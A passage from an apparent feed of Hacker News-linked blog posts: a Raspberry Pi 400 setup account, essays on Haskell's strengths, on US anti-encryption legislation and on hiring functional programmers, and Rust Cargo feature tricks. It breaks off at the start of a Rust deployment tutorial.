<p>I’ve spent the day setting my Raspberry Pi 400 up, and I’m pretty impressed. My setup has included:</p>

<ul>
  <li>Set up Chromium, and installed the <a href="https://1password.com/">1Password extension</a></li>
  <li>Installed <a href="https://code.visualstudio.com/">Visual Studio Code</a> using <a href="https://pimylifeup.com/raspberry-pi-visual-studio-code/">these instructions</a></li>
  <li>Installed the <a href="https://marketplace.visualstudio.com/items?itemName=ms-vscode-remote.remote-containers">VS Code Remote Containers extension</a> so that I can use Docker dev containers to develop code within</li>
</ul>

<p>On the whole, this setup was easy. So easy it was almost boring! I had a couple of issues, but on the whole it was very easy to set my Raspberry Pi 400 up so that I can write code, use Docker, and push changes to GitHub. For example, I’m currently writing this blog post within VS Code, building it using <a href="https://jekyllrb.com/">Jekyll</a> within a Docker container.</p>

<p>The only issue that I hit is the ARM support for various Docker images. The default Ruby dev container image wouldn’t build because it had some dependencies that didn’t have ARM variants. In the end I took the Ruby 2.7 docker image as a base, and copy/pasted into my own <code>Dockerfile</code> the parts of the defintion I needed (removing Node, Zsh, Oh my Zsh and a few other things). I’m not sure exactly what it was that was failng to build, so I need to go back and work it out, but it’s worth remembering that if the Rasberry Pi is ARM based, and not all development tools have ARM builds.</p>

<p>Having installed tools, and played around, I’ve built some very basic Rust code (with build times comparible to my MacBook!), I’ve written some <a href="https://gpiozero.readthedocs.io/en/stable/">GPIOZero</a> based Python 3 code (controlling butons and LEDs), and I’ve set up a Jekyll/Ruby dev container and built/updated my blog.</p>

<h2 id="conclusion">Conclusion</h2>

<p>I own several Raspberry Pi computers (1, 2 and 3). Most of them are the Model B format, but I have couple of Zeros too. All of them sit in a box, unused. I’ve played with them, then put them away. Part of that is because the performance hasn’t been that great, but the form factor is a major factor. It feels like the Raspberry Pi 400 has the power I need (for casual projects), and comes in a form factor that I can happily leave plugged in on my desk.</p>

<p>On top of that…it gives me a massive nostalgia rush using it!</p>

<p><img src="https://martinpeck.com/images/rpi400/desktop.jpg" alt="GPIO"></p>

<p>In the picture below I have two instances of VS Code (both running dev containers), plus I’m browsing. It takes it all in its stride.</p>

<p><img src="https://martinpeck.com/images/rpi400/pi-400-desktop.png" alt="GPIO"></p>

<p>I’ve not tried building anything huge…but that’s not what it’s for. It’s for having fun…</p>

<p>…and I’m <strong>absolutely having fun</strong>!</p>

			</div></div>]]>
            </description>
            <link>https://martinpeck.com/blog/2020/11/06/Raspberry-Pi-400/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25014025</guid>
            <pubDate>Sat, 07 Nov 2020 09:19:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Haskell: The Good Parts]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25013822">thread link</a>) | @_query
<br/>
November 7, 2020 | https://ihp.digitallyinduced.com/ShowPost?postId=14ed1d41-5ea4-4608-9c96-465443cd6e55 | <a href="https://web.archive.org/web/*/https://ihp.digitallyinduced.com/ShowPost?postId=14ed1d41-5ea4-4608-9c96-465443cd6e55">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>by Marc Scholten, 29.10.2020</em></p>

<p>
There’s been a recent blog post <a href="https://www.snoyman.com/blog/2020/10/haskell-bad-parts-1" target="_blank"><q>Haskell: The Bad Parts</q></a> in the haskell community. To keep things in balance and to spread some positive vibes we should also talk about the good parts of the haskell programming language and it’s ecosystem.
</p>

<p>
Here are some of the best parts we encountered while using Haskell at digitally induced. We focus on the advantages in the web dev space because that is what we are currently working on.
</p>

<h2>Type Safety</h2>
<p>
Haskell has one of the most impressive type systems of any programming language in practical use. If you have used TypeScript or other type safe languages in the past, you should be aware of the great advantages of having a type-checked codebase. Now think TypeScript - but 10x better. That’s how Haskell feels like.
</p>

<p>
You save a lot of time debugging runtime errors. Once the compiler approved your code, you can be pretty sure that it is working. This kind of development process is usually a lot more fun than debugging why something is <code>null</code> or <code>undefined</code>.
</p>

<p>
Once your system has hit a certain size and when new feature requests are rolling in you will want to make changes and refactor some parts of your code base. With Haskell you feel empowered to make changes to any part of your codebase.
</p>

<p>
Compare this to the ruby ecosystem: When working with rails you usually need to have lots of tests or otherwise you cannot confidently refactor code after things are running in production. And even then things will break. With the power of the type safety provided by Haskell, we can make refactorings whenever we want.
</p>

<p>
It’s really a blessing.
</p>

<h2>Managed Side Effects</h2>
<p>The way you deal with the file system, external APIs and user input is way different in Haskell than in other less functional programming languages. Your program consists of a main routine that handles the side effects and calls all your pure functions that do the real business logic.</p>

<p>
Systems build this way scale really well because there are less moving parts. Additionally pure functions can be easily tested and changed later on.
</p>

<p>
Most other languages encourage you to do side effects in an unrestricted way. For example when working in Java, a call to an object method might indirectly change the state of many related objects. This means you cannot easily reason about what a method calls does. In Haskell most functions are pure and thus don't trigger side effects like this. And when they do you can see this already by the function's type signature.
</p>

<p>
Haskell forces you to manage your side effects in a more careful way. You can still do IO and have mutable state, you just need to make this explicit inside the type signature. This leads to a far more robust system in overall.
</p>

<h2>Performance</h2>
<p>
Out of the box the performance of Haskell based web applications is great. It just feels faster than your typical Rails or PHP application. Thanks to it’s highly optimized runtime system it can also <a href="https://www.yesodweb.com/blog/2011/03/preliminary-warp-cross-language-benchmarks" target="_blank">handle way more requests than a nodejs application</a>.
</p>

<p>
And you get all that without ever thinking about performance at all. 
</p>

<h2>Tooling</h2>
<p>In 2020 it’s finally good. Thanks to <a href="https://github.com/haskell/haskell-language-server" target="_blank">Haskell Language Server</a> there’s now an easy way to have type information, documentation on hover and smart refactorings inside your text editor.</p>

<p>
With nix, cabal and stack we have the best tools for managing Haskell dependencies. Cabal hell is a thing of the past.
</p>

<p>
Great things are also happening to the Haskell compiler itself. <a href="https://github.com/ghc-proposals/ghc-proposals/pull/282" target="_blank">We soon can write dot expressions as you know from most other programming languages:</a> <code>project.name</code> instead of <code>name project</code>.
</p>

<h2>Hiring Haskell Developers</h2>
<p>
Haskell is a secret super power in that regard. The Haskell community consists of many very smart and talented software engineers. Haskell developers usually learn about Haskell because they care about their craft and about building high quality software products instead of learning about it to get a high paying job. Exactly the kind of people you want in your team.
</p>

<h2>2020 Haskell is Ready for Prime Time</h2>
<p>
For years there has been this trend of growing use of type safety as well as the growing use of functional programming techniques. What language could fill this space better than Haskell. Haskell has really matured in the last years and in 2020 it feels like it’s finally ready to conquer the world.
</p>

<p>
If this post made you interested, <a href="https://ihp.digitallyinduced.com/" target="_blank">check out IHP, our batteries-included haskell web framework.</a>
</p></div></div>]]>
            </description>
            <link>https://ihp.digitallyinduced.com/ShowPost?postId=14ed1d41-5ea4-4608-9c96-465443cd6e55</link>
            <guid isPermaLink="false">hacker-news-small-sites-25013822</guid>
            <pubDate>Sat, 07 Nov 2020 08:28:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[US Government Continues Encryption War]]>
            </title>
            <description>
<![CDATA[
Score 240 | Comments 84 (<a href="https://news.ycombinator.com/item?id=25013802">thread link</a>) | @freddyym
<br/>
November 7, 2020 | https://blog.privacytools.io/us-government-continues-encryption-war/ | <a href="https://web.archive.org/web/*/https://blog.privacytools.io/us-government-continues-encryption-war/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://blog.privacytools.io/content/images/size/w300/2020/10/binarycrypto.png 300w,
                            https://blog.privacytools.io/content/images/size/w600/2020/10/binarycrypto.png 600w,
                            https://blog.privacytools.io/content/images/size/w1000/2020/10/binarycrypto.png 1000w,
                            https://blog.privacytools.io/content/images/size/w2000/2020/10/binarycrypto.png 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://blog.privacytools.io/content/images/size/w2000/2020/10/binarycrypto.png" alt="US Government Continues Encryption War">
            </figure>

            <section>
                <div>
                    <p>Wars can be fought in the real world but there is also a virtual battlefield - and it is just as harmful. The <a href="https://www.judiciary.senate.gov/press/rep/releases/graham-cotton-blackburn-introduce-balanced-solution-to-bolster-national-security-end-use-of-warrant-proof-encryption-that-shields-criminal-activity">Lawful Access to Encrypted Data Act</a> is the latest attempt to access people's encrypted data and it serves as another reinforcement.</p><blockquote>This type of “warrant-proof” encryption adds little to the security of the communications of the ordinary user, but it is a serious benefit for those who use the internet for illicit purposes.</blockquote><p>This statement is plainly false. Encryption has as much benefit, if not more, for ordinary users. Encryption is used in every website that has the padlock sign (HTTP<strong>S</strong>), in every iPhone app since 2016, in every Android app since 2018 and in almost every modern application - and for good reason. Encryption helps protect sensitive information (such as that shared with your bank, or any time you use a password on a website). It may also help protect files which are not in use (at rest), or in the event the server is accessed by an unauthorised person (such as a criminal attempting to siphon off important data).</p><p>In 2016, Bruce Schneier wrote an article on <a href="https://www.schneier.com/essays/archives/2016/04/the_value_of_encrypt.html">the value of encryption</a> clearly outlining why encryption is needed. Schneier went on to say that when the US Government was <a href="https://blog.privacytools.io/us-government-wages-war-on-encryption/">previously</a> <a href="https://en.wikipedia.org/wiki/Crypto_Wars">fighting cryptography</a>, he wondered if they were aware how much they relied on it themselves. No-one is above the law, so if you ban strong encryption, the FBI should not use it either. Attorney General Barr, <a href="https://www.theregister.com/2019/07/23/us_encryption_backdoor/">gives the impression</a> that the government, along with certain large companies, should have an exception to the law. Barr recognises that there are some things that are secret, but he doesn't recognise that regular citizens might also want to enjoy privacy as well.</p><blockquote>“We are not talking about protecting the nation’s nuclear launch codes,” Barr told the International Conference on Cyber Security at Fordham University.</blockquote><blockquote>“Nor are we necessarily talking about the customized encryption used by large business enterprises to protect their operations. We are talking about consumer products and services such as messaging, smart phones, email, and voice and data applications."</blockquote><p>Somehow, because your average Joe does not have government level secrets, he is no longer entitled to encryption. We are all humans, and we all need privacy. By taking away encryption, you are taking away privacy online.</p><p>This act is aimed at Section 230, which ensures that no interactive computer service provider shall be treated as the publisher or speaker of content published by their users - an essential part of the survival of all search engines, social media platforms and video sharing sites. Without it, the internet would become a self-censored platform – one that is more concerned with fending off lawsuits than providing a medium for ideas and innovation as it originally was.</p><p>It is easy to sympathise with an act that is being pushed through on the grounds that terrorists, paedophiles and drug-dealers all use encryption. Reading the <a href="https://www.nytimes.com/interactive/2019/09/28/us/child-sex-abuse.html">New York Times</a>' <a href="https://www.nytimes.com/2020/02/19/podcasts/the-daily/child-sex-abuse.html">reporting</a> on online images of &nbsp;sexual abuse would leave some wondering why this sort of Act has not been passed already. Equally, if no-one had encryption then it would certainly be easier to catch above mentioned crooks and fellons.</p><p>Encryption, however, did not create these problems; these crimes were around long before it came into existence. In addition, those who partake in illicit activity will always find loopholes and ways to do so, such as using products or encryption tools that don't have backdoors. Criminals do not obey laws by definition. Furthermore, many innocent people use similar encryption to these criminals, but only to protect privacy, not hide any illegalities and yet they could still be subject to some kind of prosecution. It is assumed the use or possession of non-backdoored software would also become an offence if too many people used that instead. Statistically, it's agreed there are many more innocent people in society than criminals; those innocent people would be punished as a result of the bad actions of a few.</p><p>It is not feasible for a government to make a law of this sort that can apply outside of it's own country. Governments around the world would almost certainly disagree on which countries should be allowed access to the backdoor. As a result, this backdoor would most certainly lead to every unauthorised party having access, as the key to decrypt the data would be discovered by third parties, this would result in completely broken encryption for all. In federated networks, such as Matrix, it's not even possible to add a backdoor to every homeserver. Federation decentralises trust, which means that the person deploying the server isn't necessarily the same entity who makes the client software or server software. Matrix has even written a <a href="https://matrix.org/blog/2020/10/19/combating-abuse-in-matrix-without-backdoors">thorough article</a> on how to combat this sort of abuse without backdoors. </p><p>Weakening encryption will only result in criminals using strong encryption anyway, without fighting any of the problems that the the law claims to solve. There is no easy solution, and it is down to politicians to provide one. Yes, encryption can be used by people with bad intentions, but it is also used by so many ordinary people who would never think to use it in a malicious way. Nearly every tool in life can be used for nefarious purposes, but does not mean it should be unavailable for legitimate non-criminal uses. You could hit someone with a hammer, but it doesn't mean hammers should be made out of foam, because if they were, people would just use knives instead. Weakening encryption will not solve these issues, and that's probably because they were not the the focus of the Act. Instead, it seems that this law seeks to criminalises strong encryption that does not have backdoors, even though the government knows full well that this will not stop criminals. The US Government should stop devising new ways to breach its citizens privacy, and focus on combating the issues that this Act fails to.</p><p>In 1988, Timothy May <a href="https://activism.net/cypherpunk/crypto-anarchy.html">predicted</a> that “the State will of course try to slow or halt the spread of [encryption], citing national security concerns, use of the technology by drug dealers and tax evaders, and fears of societal disintegration”. He was spot on.</p><p><em>Cover artwork by <a href="https://setofprinciples.com/">Zan</a></em></p>
                </div>
            </section>


            

        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://blog.privacytools.io/us-government-continues-encryption-war/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25013802</guid>
            <pubDate>Sat, 07 Nov 2020 08:22:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Find a functional programmer for your JavaScript team]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25013633">thread link</a>) | @anisoco
<br/>
November 6, 2020 | https://channikhabra.com/blog/find-a-functional-programmer-for-your-javascript-team/index.html | <a href="https://web.archive.org/web/*/https://channikhabra.com/blog/find-a-functional-programmer-for-your-javascript-team/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  <blockquote>
<p>Written below are some opinions and rationalizations for them. I have come to these opinions by interviewing and working with people for years. However strongly I feel about them, they can still be wrong. If you have feedback for these, please do contact me on <a href="https://www.linkedin.com/in/channikhabra/">LinkedIn</a> or <a href="https://twitter.com/channikhabra">Twitter</a>. All kind of feedback is very much appreciated.</p>
</blockquote>
<p>From “Functional programmer” I mean a programmer familiar with concepts of <a href="https://en.wikipedia.org/wiki/Functional_programming">functional programming</a>.</p>
<p>A good teammate is someone:</p>
<ol type="1">
<li><strong>Who takes care of themselves</strong>. They invest in themselves. They care about their software as a craft, as something more than just cramming a whole bunch of frameworks and libraries.</li>
<li><strong>Who take care of their teammates</strong>.
<ul>
<li>They help their teammates grow, by mentoring and/or by serving as an example</li>
<li>They are empathetic towards other developers. This is most visible in kind of code a person writes. An empathetic developer writes code for other people.
<ul>
<li>They give preference to readability of code over micro-optimizations that make them feel clever</li>
<li>They write modular code with independent modules each of which do one thing well. And are easily composed to build more complex functionality.</li>
<li>They write clean, predictable and intuitive APIs</li>
</ul></li>
</ul></li>
</ol>
<p>FP is steadily gaining popularity, but it is still not popular enough to breach the talent pool I get to interview from. Familiarity with FP is a very good indication that the person invest in themselves. And they do that in a manner which goes beyond just increasing the number of “frameworks” they have built a Todo App in.</p>
<p>Developer empathy is surprisingly rare. In almost a decade of writing code, I have met so few developers who really give a fuck that someone else will also read their abomination. Most software is written in vacuum. Familiarity with FP don’t fix that magically.</p>
<p>However there is another factor at play here. Ironically, as a side-effect of FP, code written in a functional manner is often a lot more readable than its imperative and OOP equivalents (Impromptu quiz: What’s so ironic about this statement?). Not only is functional code itself naturally declarative, an FP person is more likely to wtf when they see unreadable code in PR reviews.</p>
<p>Basic principles of FP also make for great advice for inexperienced developers. Good software architecture is hard to learn, it is a lot harder to teach. You need a mind capable of holding large amounts of complex code before the fancy design patterns even start making sense. In comparison, “pure functions + composition” and you are good to go. That is it. That is all you need to know to get started with writing modular, testable, simple code; which is easy to write and easier to maintain. As a mere side effect of avoiding side effects, you write naturally <a href="https://en.wikipedia.org/wiki/SOLID">SOLID</a> (in spirit) code.</p>
<p>FP is not a silver bullet, but looking for functional programmers skew the universe in your favor a little. You are a lot more likely to get good people among functional programmers.</p>
</article></div>]]>
            </description>
            <link>https://channikhabra.com/blog/find-a-functional-programmer-for-your-javascript-team/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25013633</guid>
            <pubDate>Sat, 07 Nov 2020 07:12:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Advanced Cargo [Features] Usage]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25013610">thread link</a>) | @lukastyrychtr
<br/>
November 6, 2020 | https://blog.turbo.fish/cargo-features/ | <a href="https://web.archive.org/web/*/https://blog.turbo.fish/cargo-features/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    
    <small>
        Published
        <time datetime="2020-10-30">2020-10-30</time>
        on
        <a href="https://blog.turbo.fish/">blog.turbo.fish</a>
    </small>
    <p>Last year, <a href="https://blog.turbo.fish/rust-2020/">in my Rust 2020 blog post</a>, I asked for Cargo crate
features to receive some attention. Fortunately, it seems like I was not the
only one and the big feature resolver rewrite that was required to fix a number
of issues has happened. Unfortunately, the new feature resolve is still
Nightly-only, and it still doesn't fix all of my gripes with Cargo <code>[features]</code>.
Recently, I discovered some tricks to work around some of these gripes, so I
thought I should share them here!</p>
<h2 id="reusing-the-name-of-an-optional-dependency-for-a-feature">Reusing the name of an optional dependency for a feature</h2>
<p>Sometimes, you have an optional dependency, and would like to activate a feature
or another dependency automatically if that dependency is activated – exactly
like if it was a crate feature. However, you can't just create a feature of the
same name because that would cause a conflict (dependencies and features share
the same namespace<sup><a href="#1">1</a></sup>). Adding a feature of a different name and requiring your
users to activate that would be a breaking change, for something that should
really be straight-forward. What to do?</p>
<p>To answer that, let me first back up a bit:</p>
<p>Since <a href="https://blog.rust-lang.org/2018/12/06/Rust-1.31-and-rust-2018.html#cargo-features">Cargo 1.31</a>, you can rename dependencies in <code>Cargo.toml</code>. Usually, you
would do this to import multiple versions of the same crate, or, most often, to
just use the crate under a different (shorter) name. However, it also means that
referring to it in feature dependencies…</p>
<pre><code><span>[</span><span>features</span><span>]
</span><span>my_feature </span><span>= [</span><span>"&lt;here&gt;"</span><span>]
</span></code></pre>
<p>is done using the name you chose, rather than the original name. This means you
can reuse the original crate name as the name of a feature! However, it also
means that you now have to refer to the dependency using a different name in
your code. Unless…</p>
<h3 id="without-actually-renaming-it">… without actually renaming it</h3>
<p>You just rename it back in your crate root! Before renaming was possible in
<code>Cargo.toml</code>, you would do it through <code>extern crate foo as bar;</code>. Turns out you
can do this to just undo a renaming from <code>Cargo.toml</code>. In Rust 2018 crates, this
will result in both names referring to the same crate, but that should not be an
issue in practice.</p>
<p>To put all this together into a made-up example, let's say you have a crate
<code>big_crate</code> that defines a bunch of types, and has an optional dependency on
<code>serde</code> to make them (de)serializable for users who need that:</p>
<pre><code><span>[</span><span>dependencies</span><span>]
</span><span>serde </span><span>= { </span><span>version </span><span>= </span><span>"1.0.117"</span><span>, </span><span>features </span><span>= [</span><span>"derive"</span><span>], </span><span>optional </span><span>= </span><span>true </span><span>}
</span><span># other dependencies
</span></code></pre>
<p>Now your crate is rather large, and some of your users are only interested in
a rather small subset of your crate. You decide that it makes sense to have this
subset in an independent crate <code>small_crate</code>, and refactor things accordingly,
re-exporting the new crate's contents such that the API of <code>big_crate</code> stays the
same. However, some of the types with optional (de)serialization have moved too!
You need to make sure that they continue to implement <code>Deserialize</code> and
<code>Serialize</code> if <code>big_crate</code>s <code>serde</code> dependency is enabled. To do that, first
rename <code>serde</code> in <code>Cargo.toml</code>:</p>
<pre><code><span>[</span><span>dependencies</span><span>]
</span><span>serde_cr </span><span>= { </span><span>package </span><span>= </span><span>"serde"</span><span>, </span><span>version </span><span>= </span><span>"1.0.117"</span><span>, </span><span>features </span><span>= [</span><span>"derive"</span><span>], </span><span>optional </span><span>= </span><span>true </span><span>}
</span><span>small_crate </span><span>= </span><span>"0.1.0" </span><span># Added during the refactoring
# other dependencies
</span></code></pre>
<p>Then add a <code>serde</code> feature:</p>
<pre><code><span>[</span><span>features</span><span>]
</span><span>serde </span><span>= [
    </span><span>"serde_cr"</span><span>, </span><span># Enable the serde dependency...
    </span><span>"small_crate/serde"</span><span>, </span><span># ... and small_crate's serde feature
</span><span>]
</span></code></pre>
<p>and finally, undo the renaming from <code>Cargo.toml</code> in <code>big_crate</code>s <code>lib.rs</code>:</p>
<pre><code><span>extern crate</span><span> serde_cr </span><span>as</span><span> serde;
</span></code></pre>
<p>That's it. Onto the next trick!</p>
<h2 id="activating-a-dependency-if-a-combination-of-features-is-active">Activating a dependency if a combination of features is active</h2>
<small>
    or activating a feature if a combination of other features is active
</small>
<p>… is unfortunately not possible in the general case. However, there is a
workaround that works well enough for a subset of use cases: Adding a combined
feature. That is, if you have an <code>f_foo</code> feature for the <code>c_foo</code> crate and an
<code>f_bar</code> feature for the <code>c_bar</code> crate, and also need to activate the <code>c_foo_bar</code>
crate if both <code>f_foo</code> and <code>f_bar</code> are active, just require your users to use a
new feature, <code>f_foo_bar</code>, which automatically activates <code>f_foo</code> and <code>f_bar</code>, but
also the <code>c_foo_bar</code> dependency.</p>
<p>The reason this doesn't work in the general case is that other library crates
(not just applications) might want to use features your crate provides. If one
<code>rdep_1</code> activates <code>f_foo</code> and <code>rdep_2</code> activates <code>f_bar</code>, another crate
depending on both <code>rdep_1</code> and <code>rdep_2</code> would have to know how these work
internally and depend on your crate explicitly without actually using it, just
to activate <code>f_foo_bar</code>.</p>
<p>As a practical example, you can have a look at <a href="https://github.com/launchbadge/sqlx/pull/735">my PR adding rustls as an
alternative TLS backend in SQLx</a>. There, I added <em>six</em> of these
combined features for every possible combination of runtime (<code>async-std</code> /
<code>tokio</code> / <code>actix</code>) and TLS backend (<code>native-tls</code> / <code>rustls</code>). Some of the
combined features activate crates that are only relevant for that combination
of runtime and TLS backend, for example <code>tokio</code> + <code>native-tls</code> ⇒
<code>tokio-native-tls</code>.</p>
<p>This trick works very well for runtimes and TLS backends in SQLx because there
is no reason for it to expose them independently. Other crates can either select
both a runtime and TLS backend at the same time, or have their own runtime + TLS
backend features that activate the corresponding ones in SQLx.</p>
<h2 id="good-error-messages-for-mutually-exclusive-feature-misuse">Good error messages for mutually exclusive feature misuse</h2>
<p>Mutually exclusive features are not natively supported in Cargo. Of course it is
easy to make something not compile with a certain feature set, but more often
than not, you want to provide a useful error message if a conflicting feature
set is requested. This is usually solved through a conditional <code>compile_error!</code>:</p>
<pre><code><span>#[cfg(all(feature </span><span>= </span><span>"feat1"</span><span>, feature </span><span>= </span><span>"feat2"</span><span>))]
compile_error!(</span><span>"`feat1` and `feat2` may not be used at the same time"</span><span>);
</span></code></pre>
<p>However, if your crate would already not compile with these two features
activated at the same time, for example due to duplicate definitions of the
same item, this new error message is not going to replace those<sup><a href="#2">2</a></sup> but rather
just appear alongside them. That's not very user friendly!</p>
<p>To fix this, you can carefully set up your <code>#[cfg]</code>s such that all of the other
errors go away for all invalid feature sets a user could provide, for example
by using <code>#[cfg(all(feature = "feat1", not(feature = "feat2")))]</code> rather than
just <code>#[cfg(feature = "feat1")]</code> on the first definition of an item that has
different definitions for the two features. Of course, this quickly becomes a
burden if there is a non-trivial amount of feature-gated code, so I am here to
offer an alternative: Move the feature set check into a <a href="https://doc.rust-lang.org/cargo/reference/build-scripts.html">build script</a>:</p>
<pre><code><span>use </span><span>std::{env, process};

</span><span>fn </span><span>main() {
    </span><span>let</span><span> feat1_active = env::var_os(</span><span>"CARGO_FEATURE_FEAT1"</span><span>).is_some();
    </span><span>let</span><span> feat2_active = env::var_os(</span><span>"CARGO_FEATURE_FEAT2"</span><span>).is_some();

    </span><span>if</span><span> feat1_active </span><span>&amp;&amp;</span><span> feat2_active {
        eprintln!(</span><span>"error: The f1 and f2 features can't be activated at the same time."</span><span>);
        process::exit(</span><span>1</span><span>);
    }
}
</span></code></pre>
<p><em>Note: An earlier version of this post advocated using <code>compile_error!</code>, but in
a separate crate that the main crate forwards all its features to. That also
works, but is more work and as far as I know has no advantages over the build
script approach that I came up with shortly after.</em></p>



</article></div>]]>
            </description>
            <link>https://blog.turbo.fish/cargo-features/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25013610</guid>
            <pubDate>Sat, 07 Nov 2020 07:03:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Continuous Deployment for Rust Applications]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25013596">thread link</a>) | @lukastyrychtr
<br/>
November 6, 2020 | https://www.lpalmieri.com/posts/2020-11-01-zero-to-production-5-how-to-deploy-a-rust-application/ | <a href="https://web.archive.org/web/*/https://www.lpalmieri.com/posts/2020-11-01-zero-to-production-5-how-to-deploy-a-rust-application/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
  <article>
    
      
      
<ul id="frontmatter">
    <li>
        <time datetime="2020-11-01T15:00:10.47Z">November 01, 2020</time>
    </li>
    <span></span>
    <li> 7760 words </li>
    <span></span>
    <li> 39 min </li>
</ul>

      <p><em><a href="https://zero2prod.com/"><strong>Zero To Production In Rust</strong></a> is an opinionated introduction to backend development in Rust.<br>
You can pre-order the book on <a href="https://zero2prod.com/">zero2prod.com</a>.<br>
<a href="https://www.lpalmieri.com/subscribe">Subscribe to the newsletter</a> to be notified when a new episode is published.</em></p>

<ol>
<li><a href="https://lpalmieri.com/posts/2020-11-01-zero-to-production-5-how-to-deploy-a-rust-application/#1-we-must-talk-about-deployments">We Must Talk About Deployments</a></li>
<li><a href="https://lpalmieri.com/posts/2020-11-01-zero-to-production-5-how-to-deploy-a-rust-application/#2-choosing-our-tools">Choosing Our Tools</a>
<ul>
<li><a href="https://lpalmieri.com/posts/2020-11-01-zero-to-production-5-how-to-deploy-a-rust-application/#2-1-virtualisation-docker">2.1. Virtualisation: Docker</a></li>
<li><a href="https://lpalmieri.com/posts/2020-11-01-zero-to-production-5-how-to-deploy-a-rust-application/#2-2-hosting-digitalocean">2.2. Hosting: DigitalOcean</a></li>
</ul>
</li>
<li><a href="https://lpalmieri.com/posts/2020-11-01-zero-to-production-5-how-to-deploy-a-rust-application/#3-a-dockerfile-for-our-application">A Dockerfile For Our Application</a>
<ul>
<li><a href="https://lpalmieri.com/posts/2020-11-01-zero-to-production-5-how-to-deploy-a-rust-application/#3-1-dockerfiles">3.1. Dockerfiles</a></li>
<li><a href="https://lpalmieri.com/posts/2020-11-01-zero-to-production-5-how-to-deploy-a-rust-application/#3-2-build-context">3.2. Build Context</a></li>
<li><a href="https://lpalmieri.com/posts/2020-11-01-zero-to-production-5-how-to-deploy-a-rust-application/#3-3-sqlx-offline-mode">3.3. Sqlx Offline Mode</a></li>
<li><a href="https://lpalmieri.com/posts/2020-11-01-zero-to-production-5-how-to-deploy-a-rust-application/#3-4-running-an-image">3.4. Running An Image</a></li>
<li><a href="https://lpalmieri.com/posts/2020-11-01-zero-to-production-5-how-to-deploy-a-rust-application/#3-5-networking">3.5. Networking</a></li>
<li><a href="https://lpalmieri.com/posts/2020-11-01-zero-to-production-5-how-to-deploy-a-rust-application/#3-6-hierarchical-configuration">3.6. Hierarchical Configuration</a></li>
<li><a href="https://lpalmieri.com/posts/2020-11-01-zero-to-production-5-how-to-deploy-a-rust-application/#3-7-database-connectivity">3.7. Database Connectivity</a></li>
<li><a href="https://lpalmieri.com/posts/2020-11-01-zero-to-production-5-how-to-deploy-a-rust-application/#3-8-optimising-our-docker-image">3.8. Optimising Our Docker Image</a>
<ul>
<li><a href="https://lpalmieri.com/posts/2020-11-01-zero-to-production-5-how-to-deploy-a-rust-application/#3-8-1-docker-image-size">3.8.1. Docker Image Size</a></li>
<li><a href="https://lpalmieri.com/posts/2020-11-01-zero-to-production-5-how-to-deploy-a-rust-application/#3-8-2-caching-for-rust-docker-builds">3.8.2. Caching For Rust Docker Builds</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="https://lpalmieri.com/posts/2020-11-01-zero-to-production-5-how-to-deploy-a-rust-application/#4-deploy-to-digitalocean-apps-platform">Deploy To DigitalOcean Apps Platform</a>
<ul>
<li><a href="https://lpalmieri.com/posts/2020-11-01-zero-to-production-5-how-to-deploy-a-rust-application/#4-1-setup">4.1. Setup</a></li>
<li><a href="https://lpalmieri.com/posts/2020-11-01-zero-to-production-5-how-to-deploy-a-rust-application/#4-2-app-specification">4.2. App Specification</a></li>
<li><a href="https://lpalmieri.com/posts/2020-11-01-zero-to-production-5-how-to-deploy-a-rust-application/#4-3-how-to-inject-secrets-using-environment-variables">4.3. How To Inject Secrets Using Environment Variables</a></li>
<li><a href="https://lpalmieri.com/posts/2020-11-01-zero-to-production-5-how-to-deploy-a-rust-application/#4-4-connecting-to-digital-oceans-postgres-instance">4.4. Connecting To Digital Ocean's Postgres Instance</a></li>
<li><a href="https://lpalmieri.com/posts/2020-11-01-zero-to-production-5-how-to-deploy-a-rust-application/#4-5-environment-variables-in-the-app-spec">4.5. Environment Variables In The App Spec</a></li>
<li><a href="https://lpalmieri.com/posts/2020-11-01-zero-to-production-5-how-to-deploy-a-rust-application/#4-6-one-last-push">4.6. One Last Push</a></li>
</ul>
</li>
<li><a href="https://lpalmieri.com/posts/2020-11-01-zero-to-production-5-how-to-deploy-a-rust-application/#5-next-on-zero-to-production">Summary</a></li>
</ol>
<p>We have a working prototype of our newsletter API - it is now time to take it <strong>live</strong>.<br>
We will learn how to package our Rust application as a Docker container to deploy it on DigitalOcean's <a href="https://www.digitalocean.com/docs/app-platform/">App Platform</a>.<br>
At the end of the chapter we will have a <strong>C</strong>ontinuous <strong>D</strong>eployment (CD) pipeline: every commit to the <code>main</code> branch will <em>automatically</em> trigger the deployment of the latest version of the application to our users.</p>
<blockquote>
<p><em>Discuss the article on HackerNews or <a href="https://www.reddit.com/r/rust/comments/jmbxbv/a_continuous_deployment_pipeline_for_rust/">r/rust</a></em>.</p>
</blockquote>

<p>Everybody loves to talk about how important it is to deploy software to production as often as possible (and I put myself in that bunch!).</p>
<blockquote>
<p>"Get customer feedback early!"<br>
"Ship often and iterate on the product!"</p>
</blockquote>
<p>But nobody shows you <em>how</em>.</p>
